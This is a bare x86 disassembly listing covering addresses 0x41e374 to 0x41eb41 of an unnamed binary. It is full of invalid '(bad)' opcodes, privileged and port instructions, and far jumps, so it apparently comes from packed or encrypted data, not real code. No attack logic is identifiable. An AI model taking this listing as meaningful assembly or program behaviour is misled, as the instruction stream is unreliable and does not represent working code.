  41e374:	out    dx,al
  41e375:	push   ss
  41e376:	push   ss
  41e377:	es cmp al,0x63
  41e37a:	push   ecx
  41e37b:	push   esi
  41e37c:	dec    ebx
  41e37d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e37e:	inc    esp
  41e37f:	aad    0xc7
  41e381:	fisttp QWORD PTR [ebp+0x63fdf98a]
  41e387:	dec    edx
  41e388:	test   BYTE PTR [edx+0x2],0xcf
  41e38c:	mov    ah,0x2
  41e38e:	mov    ecx,0xf0dc6e8c
  41e393:	and    al,0xcf
  41e395:	xor    al,0x1b
  41e397:	cmc    
  41e398:	push   es
  41e399:	mov    bh,0xdd
  41e39b:	daa    
  41e39c:	inc    ebp
  41e39d:	int3   
  41e39e:	cmp    esi,DWORD PTR [ebp+0x9a4154f]
  41e3a4:	popf   
  41e3a5:	cli    
  41e3a6:	dec    edx
  41e3a7:	(bad)  
  41e3a8:	(bad)  
  41e3a9:	stc    
  41e3aa:	push   esp
  41e3ab:	pop    ds
  41e3ac:	retf   0x47fb
  41e3af:	mov    bh,0xf1
  41e3b1:	cmp    ah,0x66
  41e3b4:	out    dx,al
  41e3b5:	jno    0x41e3ee
  41e3b7:	push   eax
  41e3b8:	push   eax
  41e3b9:	(bad)  
  41e3ba:	repz inc esi
  41e3bc:	fist   WORD PTR [edi+0xeeb3f88]
  41e3c2:	js     0x41e3f8
  41e3c4:	push   0xb54bf22d
  41e3c9:	dec    ecx
  41e3ca:	and    BYTE PTR [ecx-0x43],al
  41e3cd:	nop
  41e3ce:	cmp    al,0x8d
  41e3d0:	ror    DWORD PTR [ebx],cl
  41e3d2:	ds xchg esp,eax
  41e3d4:	push   ebx
  41e3d5:	push   eax
  41e3d6:	popa   
  41e3d7:	(bad)  
  41e3d8:	fld    QWORD PTR [edx+eiz*8]
  41e3db:	(bad)  [ecx]
  41e3dd:	cld    
  41e3de:	sub    edi,0xd434995b
  41e3e4:	mov    sp,WORD PTR [ecx+0x3f01b1c0]
  41e3eb:	lods   al,BYTE PTR ds:[esi]
  41e3ec:	mov    al,0x68
  41e3ee:	add    eax,ebx
  41e3f0:	xor    ebp,DWORD PTR [esi-0x6d61e8fc]
  41e3f6:	sbb    eax,0x7825c736
  41e3fb:	jb     0x41e43c
  41e3fd:	xchg   edx,eax
  41e3fe:	fiadd  DWORD PTR [ebx-0x7f]
  41e401:	mov    dh,0x76
  41e403:	lds    eax,FWORD PTR ds:0xf467c60a
  41e409:	mov    al,ds:0xa57b4451
  41e40e:	rol    DWORD PTR [eax],cl
	...
  41e418:	add    BYTE PTR [eax],al
  41e41a:	add    ch,cl
  41e41c:	sub    eax,0xfbf54395
  41e421:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e427:	jmp    0x1a1:0x3b02a09f
  41e42e:	add    BYTE PTR [eax+eax*1-0x5d460000],ch
  41e435:	enter  0x1ba7,0x16
  41e439:	inc    esi
  41e43a:	inc    ebp
  41e43b:	cmc    
  41e43c:	hlt    
  41e43d:	pop    edi
  41e43e:	dec    eax
  41e43f:	adc    al,0x71
  41e441:	cmp    ch,BYTE PTR [ecx-0x24]
  41e444:	mov    DWORD PTR [eax-0x268026da],eax
  41e44a:	jne    0x41e40d
  41e44c:	add    DWORD PTR [ebp*2+0x37f04cc5],esp
  41e453:	daa    
  41e454:	dec    ecx
  41e455:	pop    esp
  41e456:	or     eax,0x2f3846fe
  41e45b:	outs   dx,BYTE PTR ds:[esi]
  41e45c:	lock push ecx
  41e45e:	enter  0x191c,0x96
  41e462:	pop    es
  41e463:	xchg   ebx,eax
  41e464:	test   al,0x26
  41e466:	in     al,0x25
  41e468:	rcl    BYTE PTR [ecx-0x52],0x9
  41e46c:	es shr esi,0xa1
  41e470:	jmp    FWORD PTR [edi+eiz*8-0x5e]
  41e474:	xchg   BYTE PTR [ebx+0x6b],bh
  41e477:	nop
  41e478:	imul   BYTE PTR [ecx-0x1152627b]
  41e47e:	jbe    0x41e4e9
  41e480:	or     al,0xf3
  41e482:	lock cmc 
  41e484:	shr    eax,0xd1
  41e487:	adc    ah,cl
  41e489:	ficom  WORD PTR [ecx-0x6a946305]
  41e48f:	jae    0x41e477
  41e491:	out    0x75,eax
  41e493:	pop    ebx
  41e494:	xlat   BYTE PTR ds:[ebx]
  41e495:	adc    DWORD PTR [eax+0x7a185d1e],esi
  41e49b:	shl    BYTE PTR [eax],cl
  41e49d:	and    DWORD PTR [ecx-0x57],0x629d94bc
  41e4a4:	loop   0x41e44e
  41e4a6:	xchg   edi,eax
  41e4a7:	std    
  41e4a8:	aad    0xd
  41e4aa:	jno    0x41e50a
  41e4ac:	aaa    
  41e4ad:	or     DWORD PTR [eax-0x51],edx
  41e4b0:	mov    edx,0x690f3d6e
  41e4b5:	cmp    BYTE PTR [ecx],al
  41e4b7:	sub    BYTE PTR [ebp+0x64],al
  41e4ba:	jmp    0x41e47d
  41e4bc:	(bad)  [edi+0x36396083]
  41e4c2:	not    dh
  41e4c4:	xchg   ecx,eax
  41e4c5:	cdq    
  41e4c6:	ds fs push edi
  41e4c9:	cwde   
  41e4ca:	sub    al,0xf6
  41e4cc:	xchg   esp,eax
  41e4cd:	xor    ch,bh
  41e4cf:	xchg   BYTE PTR [ecx-0x5c],cl
  41e4d2:	aaa    
  41e4d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4d4:	nop
  41e4d5:	loopne 0x41e504
  41e4d7:	stos   BYTE PTR es:[edi],al
  41e4d8:	dec    ebp
  41e4d9:	push   0x545ce9ce
  41e4de:	inc    esi
	...
  41e4eb:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  41e4ef:	test   DWORD PTR [ebx-0xce58301],0xd6404cfc
  41e4f9:	and    al,al
  41e4fb:	out    0xa1,eax
  41e4fd:	add    DWORD PTR [eax],eax
  41e4ff:	lods   al,BYTE PTR ds:[esi]
  41e500:	add    BYTE PTR [eax],al
  41e502:	add    BYTE PTR [ebx+ecx*4-0xa],ch
  41e506:	add    BYTE PTR [ecx],al
  41e508:	nop
  41e509:	sahf   
  41e50a:	push   ebx
  41e50b:	loopne 0x41e527
  41e50d:	sub    al,0x1b
  41e50f:	push   esi
  41e510:	pop    ebp
  41e511:	fdiv   QWORD PTR [eax+0x66]
  41e514:	not    ebp
  41e516:	leave  
  41e517:	pop    edi
  41e518:	pushf  
  41e519:	xlat   BYTE PTR ds:[ebx]
  41e51a:	jp     0x41e4fd
  41e51c:	stos   DWORD PTR es:[edi],eax
  41e51d:	inc    esp
  41e51e:	(bad)  
  41e51f:	not    ebx
  41e521:	xor    BYTE PTR [esi+0x3a],dl
  41e524:	mov    esp,ebp
  41e526:	jno    0x41e555
  41e528:	pushf  
  41e529:	cmp    ch,bl
  41e52b:	rcr    esi,0x7c
  41e52e:	xchg   ebx,eax
  41e52f:	test   al,0x38
  41e531:	mov    dl,0x41
  41e533:	push   0x2acfad51
  41e538:	aam    0x33
  41e53a:	pop    eax
  41e53b:	xchg   edx,eax
  41e53c:	imul   eax,DWORD PTR [ebx-0x1bcdf6b9],0x46a04a11
  41e546:	scas   eax,DWORD PTR es:[edi]
  41e547:	int    0x70
  41e549:	lods   eax,DWORD PTR ds:[esi]
  41e54a:	test   al,0x85
  41e54c:	in     eax,0x61
  41e54e:	sahf   
  41e54f:	inc    esi
  41e550:	dec    ebx
  41e551:	cmc    
  41e552:	xchg   ecx,eax
  41e553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e554:	jl     0x41e560
  41e556:	loop   0x41e532
  41e558:	inc    ebp
  41e559:	xor    eax,0xf5f7352a
  41e55e:	test   edi,ebp
  41e560:	mov    eax,0x334fa07b
  41e565:	pop    edx
  41e566:	dec    ebx
  41e567:	cwde   
  41e568:	call   DWORD PTR [ebx]
  41e56a:	das    
  41e56b:	fcom   QWORD PTR [ebx-0x28115270]
  41e571:	xor    eax,0x4573a56e
  41e576:	in     eax,dx
  41e577:	mov    ebp,0xd4d94cf9
  41e57c:	pop    ecx
  41e57d:	add    ebx,edi
  41e57f:	dec    esi
  41e580:	and    al,0x4e
  41e582:	pop    es
  41e583:	stc    
  41e584:	adc    BYTE PTR [ebx],bh
  41e586:	ins    DWORD PTR es:[edi],dx
  41e587:	inc    esi
  41e588:	mov    edi,0xf47b0edf
  41e58d:	push   ecx
  41e58e:	lds    edi,FWORD PTR [ebx+0x52fdd81]
  41e594:	sets   dl
  41e597:	mov    cl,0x76
  41e599:	mov    dl,BYTE PTR [esi+0x2a]
  41e59c:	jne    0x41e52e
  41e59e:	xchg   edi,eax
  41e59f:	add    DWORD PTR [ebp-0x66],esp
  41e5a2:	jnp    0x41e5bb
  41e5a4:	ins    DWORD PTR es:[edi],dx
  41e5a5:	dec    ebp
  41e5a6:	inc    edx
  41e5a7:	and    al,0x39
  41e5a9:	iret   
  41e5aa:	cmp    esp,esi
  41e5ac:	(bad)  
  41e5ad:	cmp    al,0x75
	...
  41e5bb:	daa    
  41e5bc:	push   ecx
  41e5bd:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41e5c7:	addr16 cmp al,0xc2
  41e5ca:	int    0x93
  41e5cc:	mov    ds:0xac0001,al
  41e5d1:	add    BYTE PTR [eax],al
  41e5d3:	xchg   ecx,eax
  41e5d4:	pop    ebx
  41e5d5:	test   al,0x8a
  41e5d7:	inc    esp
  41e5d8:	arpl   WORD PTR [edx],di
  41e5da:	(bad)  
  41e5db:	(bad)  
  41e5dc:	and    BYTE PTR [eax-0x9],dl
  41e5df:	inc    edx
  41e5e0:	and    dl,BYTE PTR [edx+0x276e9213]
  41e5e6:	add    ah,bl
  41e5e8:	nop
  41e5e9:	js     0x41e574
  41e5eb:	xor    esi,DWORD PTR [edx]
  41e5ed:	fdivr  QWORD PTR [ebx-0x80]
  41e5f0:	out    0xdc,al
  41e5f2:	ret    
  41e5f3:	pop    ss
  41e5f4:	ret    
  41e5f5:	xchg   edi,eax
  41e5f6:	ja     0x41e5ca
  41e5f8:	mov    edi,0xf0fcfc5d
  41e5fd:	or     BYTE PTR [esi-0x5f61f220],bl
  41e603:	in     al,0x3b
  41e605:	ds or  al,0xc2
  41e608:	jg     0x41e59d
  41e60a:	push   esp
  41e60b:	inc    ebp
  41e60c:	mov    al,ds:0x441ec621
  41e611:	pop    ecx
  41e612:	jg     0x41e5e1
  41e614:	sbb    eax,0x4e
  41e617:	mov    ds:0x33ce52bf,eax
  41e61c:	stos   DWORD PTR es:[edi],eax
  41e61d:	es jo  0x41e624
  41e620:	(bad)  
  41e621:	ja     0x41e62b
  41e623:	pop    ebp
  41e624:	fwait
  41e625:	retf   0xa0f1
  41e628:	mov    DWORD PTR [edi+ebx*1+0x588d9512],ebp
  41e62f:	in     al,0xa0
  41e631:	dec    ecx
  41e632:	loopne 0x41e5bd
  41e634:	or     ebp,esp
  41e636:	cmp    ah,bh
  41e638:	jns    0x41e5c3
  41e63a:	push   eax
  41e63b:	js     0x41e633
  41e63d:	mov    ds,WORD PTR [ebx]
  41e63f:	ins    DWORD PTR es:[edi],dx
  41e640:	xor    BYTE PTR [edx],dl
  41e642:	lea    ebx,[edi+esi*8-0x3d]
  41e646:	add    ah,BYTE PTR [bp+di-0x5f]
  41e64a:	std    
  41e64b:	leave  
  41e64c:	jle    0x41e633
  41e64e:	ins    BYTE PTR es:[edi],dx
  41e64f:	imul   ebx,DWORD PTR [edx-0x5],0x7d
  41e653:	dec    esi
  41e654:	je     0x41e69c
  41e656:	add    DWORD PTR [edi],edi
  41e658:	shr    dl,1
  41e65a:	lea    eax,[edi]
  41e65c:	out    dx,eax
  41e65d:	push   eax
  41e65e:	jns    0x41e657
  41e660:	jbe    0x41e673
  41e662:	jno    0x41e695
  41e664:	pusha  
  41e665:	into   
  41e666:	pushf  
  41e667:	mov    ds:0xf6c76bae,eax
  41e66c:	mov    BYTE PTR [esi],ah
  41e66e:	mov    dh,0x86
  41e670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e671:	adc    al,0x52
  41e673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e674:	push   edi
  41e675:	jae    0x41e5f9
  41e677:	bound  ebx,QWORD PTR [ebx-0x3]
  41e67a:	jmp    0x0:0xcb0c651
	...
  41e689:	add    BYTE PTR [eax],al
  41e68b:	add    dl,BYTE PTR ss:[ebp+0xc]
  41e68f:	jne    0x41e6f0
  41e691:	jg     0x41e6cd
  41e693:	clc    
  41e694:	cs aas 
  41e696:	push   0x4ebe4088
  41e69b:	arpl   WORD PTR [edx+0xac0001],cx
  41e6a1:	add    BYTE PTR [eax],al
  41e6a3:	test   DWORD PTR [ebx+0x78b94b1c],ecx
  41e6a9:	and    ch,BYTE PTR [edx]
  41e6ab:	gs push esp
  41e6ad:	ins    BYTE PTR es:[edi],dx
  41e6ae:	pop    ecx
  41e6af:	add    al,0x9c
  41e6b1:	lock sbb BYTE PTR [edi-0x26],0x41
  41e6b6:	loopne 0x41e6e3
  41e6b8:	in     al,dx
  41e6b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6ba:	repnz fcmovnb st,st(5)
  41e6bd:	sbb    esp,DWORD PTR [ebx+0x25]
  41e6c0:	jo     0x41e6ff
  41e6c2:	xchg   edi,eax
  41e6c3:	(bad)  
  41e6c4:	(bad)  
  41e6c5:	dec    ebp
  41e6c6:	int3   
  41e6c7:	push   ss
  41e6c8:	pop    ebp
  41e6c9:	fwait
  41e6ca:	pushf  
  41e6cb:	sub    BYTE PTR [edi+0x58],bh
  41e6ce:	adc    BYTE PTR ds:0x4f981ae2,bh
  41e6d4:	xchg   DWORD PTR [ecx],edx
  41e6d6:	push   edx
  41e6d7:	mov    esp,0x7a586470
  41e6dc:	xor    BYTE PTR [ebp+0x3f028199],dl
  41e6e2:	and    al,0x28
  41e6e4:	sti    
  41e6e5:	cmp    ebx,DWORD PTR [edx-0x3a]
  41e6e8:	push   ebp
  41e6e9:	mov    ebx,0x149f773d
  41e6ee:	and    dh,ch
  41e6f0:	cmp    DWORD PTR [ebp+ebx*1-0x41],0x1a
  41e6f5:	sbb    al,0x42
  41e6f7:	sub    DWORD PTR [edi-0x3cb7d84a],0x47a7d3d0
  41e701:	popa   
  41e702:	jmp    0x40e9:0xeeab3f58
  41e709:	xchg   BYTE PTR [ecx-0x74],bl
  41e70c:	jmp    DWORD PTR [edi]
  41e70e:	lahf   
  41e70f:	aam    0x2c
  41e711:	jb     0x41e716
  41e713:	jo     0x41e745
  41e715:	inc    edi
  41e716:	xchg   esp,eax
  41e717:	into   
  41e718:	call   0x1835:0x71a13a84
  41e71f:	and    ebx,DWORD PTR [eax+0x6bae53aa]
  41e725:	int3   
  41e726:	(bad)  
  41e727:	loop   0x41e71c
  41e729:	push   eax
  41e72a:	mov    dh,0x86
  41e72c:	push   ebp
  41e72d:	imul   ecx,DWORD PTR ds:0xc2bae634,0x20bea60e
  41e737:	test   eax,0xa87fb521
  41e73c:	sbb    ebx,esp
  41e73e:	lds    esi,FWORD PTR [edx+0x1a]
  41e741:	je     0x41e7a6
  41e743:	jb     0x41e79d
  41e745:	cmp    esi,DWORD PTR [ebp-0x2e]
  41e748:	lea    edi,[ecx-0x50cbb8d5]
  41e74e:	aaa    
	...
  41e75b:	or     BYTE PTR [ecx-0x404c48e],dh
  41e761:	dec    ecx
  41e762:	mov    bl,0x94
  41e764:	je     0x41e73d
  41e766:	call   0x8b0f:0x80938857
  41e76d:	add    DWORD PTR [eax],eax
  41e76f:	lods   al,BYTE PTR ds:[esi]
  41e770:	add    BYTE PTR [eax],al
  41e772:	add    BYTE PTR [eax],dh
  41e774:	hlt    
  41e775:	lods   eax,DWORD PTR ds:[esi]
  41e776:	mov    bh,dh
  41e778:	fimul  WORD PTR [ecx]
  41e77a:	mov    ds:0x20673641,eax
  41e77f:	not    DWORD PTR [ebp+0x7f]
  41e782:	inc    eax
  41e783:	inc    ecx
  41e784:	pop    ss
  41e785:	mov    ebx,0xdaf18420
  41e78a:	in     al,dx
  41e78b:	and    ecx,DWORD PTR [eax-0x63]
  41e78e:	mov    bh,0xea
  41e790:	out    dx,eax
  41e791:	aas    
  41e792:	mov    bl,0xc1
  41e794:	out    0xca,al
  41e796:	sahf   
  41e797:	pushf  
  41e798:	jmp    0x471d:0xf36cc6c1
  41e79f:	and    ecx,edi
  41e7a1:	add    BYTE PTR [edx+ebp*1],0x3e
  41e7a5:	js     0x41e826
  41e7a7:	or     eax,DWORD PTR [ebp+ebx*2-0x11ea7d11]
  41e7ae:	ins    BYTE PTR es:[edi],dx
  41e7af:	and    BYTE PTR [ebp-0x4b],al
  41e7b2:	leave  
  41e7b3:	ficom  WORD PTR [ecx]
  41e7b5:	add    ecx,DWORD PTR [edx+0x5f]
  41e7b8:	dec    ebx
  41e7b9:	test   eax,0xe6a4a246
  41e7be:	das    
  41e7bf:	adc    al,0xda
  41e7c1:	andps  xmm2,XMMWORD PTR [ebp+eiz*8-0x2b]
  41e7c6:	mov    esp,0x4beb93cb
  41e7cb:	xchg   ecx,eax
  41e7cc:	repnz hlt 
  41e7ce:	sbb    eax,0x12d95047
  41e7d3:	popa   
  41e7d4:	cmp    ebx,DWORD PTR [edx+edx*8]
  41e7d7:	test   DWORD PTR [edi-0x7fe31d95],edi
  41e7dd:	mov    bh,0x23
  41e7df:	retf   
  41e7e0:	lahf   
  41e7e1:	aam    0x83
  41e7e3:	mov    bh,0xcf
  41e7e5:	sbb    eax,0xcfc2c55
  41e7ea:	int    0xba
  41e7ec:	mov    dh,0x8
  41e7ee:	in     eax,0x1a
  41e7f0:	fld    TBYTE PTR [ebx+esi*8+0x4abea922]
  41e7f7:	mov    ds:0x86fa42c2,eax
  41e7fc:	stos   BYTE PTR es:[edi],al
  41e7fd:	or     bh,BYTE PTR [edx-0x2b]
  41e800:	sub    DWORD PTR [ebp-0xc],eax
  41e803:	rol    DWORD PTR [ecx+ebp*4],1
  41e806:	push   esp
  41e807:	leave  
  41e808:	sbb    al,0x6
  41e80a:	adc    BYTE PTR [ebp-0x2cf4b38f],ch
  41e810:	cld    
  41e811:	push   ss
  41e812:	pop    edx
  41e813:	loopne 0x41e85f
  41e815:	rcl    DWORD PTR [esi],1
  41e817:	jmp    0x608:0x886437c1
  41e81e:	repnz add BYTE PTR [eax],al
	...
  41e829:	add    BYTE PTR [eax],al
  41e82b:	fist   WORD PTR [ebx-0x4e]
  41e82e:	dec    edi
  41e82f:	mov    esi,0x67d3ffef
  41e834:	xchg   ecx,edi
  41e836:	adc    al,0xd
  41e838:	xor    BYTE PTR [ecx],0x94
  41e83b:	mov    ebx,0xac00018b
  41e840:	add    BYTE PTR [eax],al
  41e842:	add    BYTE PTR [eax],al
  41e844:	adc    BYTE PTR ds:0x513f9761,ah
  41e84a:	xchg   esi,eax
  41e84b:	pop    edi
  41e84c:	cmc    
  41e84d:	loope  0x41e7e9
  41e84f:	test   BYTE PTR [edx],ah
  41e851:	or     eax,0x5bf72e3d
  41e856:	lea    edx,[edx]
  41e858:	stos   BYTE PTR es:[edi],al
  41e859:	push   ds
  41e85a:	adc    al,ch
  41e85c:	pop    ecx
  41e85d:	fmul   QWORD PTR [ebx-0x36]
  41e860:	fdiv   QWORD PTR [ebp-0x5abc9299]
  41e866:	mov    al,ds:0x5a80d780
  41e86b:	mov    dl,0xdc
  41e86d:	hlt    
  41e86e:	mov    ds:0xa8ec268c,eax
  41e873:	ja     0x41e8ab
  41e875:	xchg   edx,eax
  41e876:	shr    DWORD PTR [ebx-0x46922be4],1
  41e87c:	stos   BYTE PTR es:[edi],al
  41e87d:	out    dx,eax
  41e87e:	or     DWORD PTR [ecx-0x43],eax
  41e881:	xlat   BYTE PTR ds:[ebx]
  41e882:	mov    DWORD PTR [eax-0x44],esp
  41e885:	jbe    0x41e89c
  41e887:	mov    bh,0xde
  41e889:	shl    BYTE PTR [esi],cl
  41e88b:	mov    ch,0x73
  41e88d:	mov    esp,0x2418977
  41e892:	out    dx,al
  41e893:	xor    edi,edx
  41e895:	aaa    
  41e896:	in     eax,0x6a
  41e898:	push   es
  41e899:	enter  0xe435,0x95
  41e89d:	loope  0x41e8f6
  41e89f:	(bad)  
  41e8a0:	adc    bh,BYTE PTR [esi+0xe]
  41e8a3:	shl    DWORD PTR [ecx-0x64c6477f],0x59
  41e8aa:	test   al,0x1c
  41e8ac:	jmp    0xdf50:0xeb106c95
  41e8b3:	lea    edx,[esi+eax*4-0x72fc69aa]
  41e8ba:	into   
  41e8bb:	adc    DWORD PTR [esi],0xcb82969b
  41e8c1:	pop    ebp
  41e8c2:	fldpi  
  41e8c4:	(bad)  
  41e8c6:	push   edi
  41e8c7:	push   edx
  41e8c8:	cmp    al,0x36
  41e8ca:	loop   0x41e8d1
  41e8cc:	hlt    
  41e8cd:	and    ch,BYTE PTR [eax+ebx*8]
  41e8d0:	(bad)  
  41e8d1:	cmp    ebp,eax
  41e8d3:	ss mov bh,0xac
  41e8d6:	push   ebp
  41e8d7:	mov    ebp,0xa3849550
  41e8dc:	jo     0x41e945
  41e8de:	leave  
  41e8df:	imul   esi,DWORD PTR [edi+0x77],0x9
  41e8e3:	pop    edx
  41e8e4:	add    edx,DWORD PTR [eax+ebp*8]
  41e8e7:	(bad)  
  41e8e8:	mov    ds:0xf620400a,al
  41e8ed:	sub    eax,0x4f
	...
  41e8fa:	add    BYTE PTR [edi-0x24252cf4],al
  41e900:	fisttp WORD PTR [edi+0x640ccb5d]
  41e906:	push   ss
  41e907:	lea    ecx,[edi-0x9]
  41e90a:	adc    al,0x67
  41e90c:	mov    WORD PTR [ecx],es
  41e90e:	add    BYTE PTR [eax+eax*1+0x73da0000],ch
  41e915:	pop    edi
  41e916:	stos   BYTE PTR es:[edi],al
  41e917:	ja     0x41e8e1
  41e919:	out    0xff,al
  41e91b:	xchg   ebp,eax
  41e91c:	loop   0x41e914
  41e91e:	je     0x41e965
  41e920:	lock mov al,0xd8
  41e923:	jb     0x41e906
  41e925:	test   esi,edi
  41e927:	mov    bh,0x8d
  41e929:	push   0x6d6689b1
  41e92e:	icebp  
  41e92f:	sub    eax,DWORD PTR [edi-0xf]
  41e932:	je     0x41e997
  41e934:	mov    ds:0x5c329a26,al
  41e939:	cmp    eax,0x21037ea3
  41e93e:	sub    eax,0xb784b5b7
  41e943:	inc    eax
  41e944:	lock fwait
  41e946:	call   0x8ab6:0x31429208
  41e94d:	cdq    
  41e94e:	ret    0xa76
  41e951:	adc    DWORD PTR [ebx],ebx
  41e953:	sub    BYTE PTR [ecx],bh
  41e955:	xchg   esp,eax
  41e956:	ins    BYTE PTR es:[edi],dx
  41e957:	sub    eax,0x50632d0a
  41e95c:	jne    0x41e909
  41e95e:	nop
  41e95f:	adc    BYTE PTR [ebx+0x4d0dd787],0x23
  41e966:	jae    0x41e983
  41e968:	push   ecx
  41e969:	loope  0x41e95a
  41e96b:	sub    eax,0x10eadf0d
  41e970:	mov    ?,ebp
  41e972:	jecxz  0x41e91d
  41e974:	pushf  
  41e975:	sbb    BYTE PTR [edx+0x12],0x5e
  41e979:	ret    0xeeb7
  41e97c:	cmp    DWORD PTR [ebx-0x8],eax
  41e97f:	call   0x36a9:0xe02072d
  41e986:	(bad)  
  41e987:	jecxz  0x41e93d
  41e989:	mov    bh,0x2b
  41e98b:	pop    ebx
  41e98c:	jne    0x41e93e
  41e98e:	mov    ds:0xbc6acb20,al
  41e993:	sti    
  41e994:	push   fs
  41e996:	inc    eax
  41e997:	xchg   edx,eax
  41e998:	jns    0x41e969
  41e99a:	mov    esi,0x897d3340
  41e99f:	into   
  41e9a0:	pop    ecx
  41e9a1:	into   
  41e9a2:	or     bh,BYTE PTR [eax-0x30f242f8]
  41e9a8:	xor    BYTE PTR [esi-0xd9468a3],ch
  41e9ae:	(bad)  
  41e9af:	jmp    0xc54a:0xbbfdab62
  41e9b6:	loopne 0x41ea12
  41e9b8:	in     al,dx
  41e9b9:	popa   
  41e9ba:	cs pop esp
  41e9bc:	lods   eax,DWORD PTR ds:[esi]
  41e9bd:	pop    esi
  41e9be:	sbb    DWORD PTR [eax],eax
	...
  41e9c8:	add    BYTE PTR [eax],al
  41e9ca:	add    BYTE PTR [edi-0x28db29d],bl
  41e9d0:	jle    0x41e991
  41e9d2:	out    dx,eax
  41e9d3:	sbb    edi,esp
  41e9d5:	mov    BYTE PTR [ecx+eiz*1+0x1380fe16],dh
  41e9dc:	lea    eax,[ecx]
  41e9de:	add    BYTE PTR [eax+eax*1-0x41790000],ch
  41e9e5:	cli    
  41e9e6:	xor    al,0x7e
  41e9e8:	dec    edi
  41e9e9:	add    ecx,ecx
  41e9eb:	and    DWORD PTR [edx-0x24],eax
  41e9ee:	xor    DWORD PTR [edx],edx
  41e9f0:	lock push cs
  41e9f2:	cmp    BYTE PTR cs:[esi+edx*1+0x2105d658],ch
  41e9fa:	data16 and al,0x83
  41e9fd:	dec    ecx
  41e9fe:	sub    BYTE PTR [ecx-0x51],bl
  41ea01:	pop    es
  41ea02:	inc    ebx
  41ea03:	inc    edi
  41ea04:	jecxz  0x41ea33
  41ea06:	pop    ecx
  41ea07:	mov    edx,0xd39c8989
  41ea0c:	lahf   
  41ea0d:	push   edx
  41ea0e:	sbb    esi,DWORD PTR [ebx-0x48a6e7a0]
  41ea14:	hlt    
  41ea15:	cmp    dl,dh
  41ea17:	mov    bh,0x9b
  41ea19:	sbb    bl,BYTE PTR [ecx+0x268df176]
  41ea1f:	jmp    0x41ea24
  41ea21:	mov    DWORD PTR [edi-0x2f07f56b],ebx
  41ea27:	das    
  41ea28:	mov    ds:0x11b938f4,eax
  41ea2d:	mov    cl,dh
  41ea2f:	scas   eax,DWORD PTR es:[edi]
  41ea30:	int    0xa1
  41ea32:	jge    0x41ea09
  41ea34:	pop    DWORD PTR [eax-0x3f]
  41ea37:	popf   
  41ea38:	dec    eax
  41ea39:	xor    eax,0x2ae7c6ff
  41ea3e:	out    0xb7,eax
  41ea40:	aad    0xcb
  41ea42:	push   cs
  41ea43:	dec    esi
  41ea44:	cdq    
  41ea45:	pop    ds
  41ea46:	jp     0x41eab6
  41ea48:	ja     0x41ea2c
  41ea4a:	jne    0x41ea3c
  41ea4c:	and    eax,0x9efae344
  41ea51:	or     eax,0xfd270ca2
  41ea56:	xchg   ebx,eax
  41ea57:	push   0x5d
  41ea59:	adc    esp,DWORD PTR [edx]
  41ea5b:	(bad)  
  41ea5c:	mov    ah,0xf
  41ea5e:	popa   
  41ea5f:	xchg   BYTE PTR [ecx-0xf0eac2b],cl
  41ea65:	dec    esp
  41ea66:	push   ebp
  41ea67:	frstor [edi]
  41ea69:	xor    edi,edi
  41ea6b:	cmp    DWORD PTR [ecx],ebp
  41ea6d:	sub    dl,ah
  41ea6f:	not    DWORD PTR [ebx]
  41ea71:	rol    BYTE PTR [ecx+0x62729258],cl
  41ea77:	mov    edi,0xe0309f4e
  41ea7c:	popf   
  41ea7d:	idiv   DWORD PTR [edi+esi*4-0x1efdd75b]
  41ea84:	std    
  41ea85:	sub    DWORD PTR [ecx],0x9347366e
  41ea8b:	adc    BYTE PTR [ebx],bh
  41ea8d:	mov    WORD PTR [edi],?
	...
  41ea9b:	jo     0x41eac0
  41ea9d:	and    eax,0x7c6f7769
  41eaa2:	cmp    esp,DWORD PTR [eax-0x624311e4]
  41eaa8:	repz add al,bl
  41eaab:	mov    edi,0xac00018d
  41eab0:	add    BYTE PTR [eax],al
  41eab2:	add    cl,dl
  41eab4:	retf   0x54d8
  41eab7:	inc    eax
  41eab8:	push   es
  41eab9:	or     eax,0xededd251
  41eabe:	loope  0x41ea45
  41eac0:	jae    0x41eaee
  41eac2:	ins    DWORD PTR es:[edi],dx
  41eac3:	or     eax,0xd7ae9222
  41eac8:	pop    edx
  41eac9:	cmp    al,0x78
  41eacb:	xor    al,0xc7
  41eacd:	xchg   esp,eax
  41eace:	sub    BYTE PTR [ebx+0x14ff0b5e],dl
  41ead4:	adc    al,0x5a
  41ead6:	xchg   eax,eax
  41ead8:	mov    WORD PTR [esi-0x36],?
  41eadb:	jae    0x41eb21
  41eadd:	sub    DWORD PTR [ecx-0x5c],eax
  41eae0:	imul   edi,DWORD PTR [edi-0x5d],0xffffffdf
  41eae4:	jae    0x41eaf1
  41eae6:	pop    es
  41eae7:	ror    DWORD PTR [eax-0x5d],1
  41eaea:	daa    
  41eaeb:	fsubr  DWORD PTR [esi-0x7384d8ed]
  41eaf1:	add    BYTE PTR [edx+0x5e],dh
  41eaf4:	sub    DWORD PTR [edi-0x9],ecx
  41eaf7:	cld    
  41eaf8:	pop    ds
  41eaf9:	pop    esp
  41eafa:	pop    eax
  41eafb:	and    BYTE PTR [eax+0x76],bh
  41eafe:	xchg   edx,eax
  41eaff:	int    0x2d
  41eb01:	and    eax,0xd51cf68e
  41eb06:	test   BYTE PTR [esi-0x73],dl
  41eb09:	jg     0x41eb4d
  41eb0b:	sahf   
  41eb0c:	mov    edi,0x7e5a067
  41eb11:	loope  0x41eadd
  41eb13:	in     eax,0xb0
  41eb15:	xchg   ecx,eax
  41eb16:	enter  0x7eb3,0x22
  41eb1a:	aad    0xd4
  41eb1c:	outs   dx,DWORD PTR ds:[esi]
  41eb1d:	js     0x41eaeb
  41eb1f:	jl     0x41eb26
  41eb21:	repz mov ebx,0x4c37338
  41eb27:	imul   eax,DWORD PTR [eax],0x13
  41eb2a:	adc    edi,ebp
  41eb2c:	sub    eax,0xe98868d2
  41eb31:	(bad)  
  41eb32:	scas   al,BYTE PTR es:[edi]
  41eb33:	je     0x41ebb4
  41eb35:	cmp    eax,0xc1842a1b
  41eb3a:	mov    eax,0xad070b40
  41eb3f:	dec    esp
  41eb40:	push   ebp
  41eb41:	pushf  
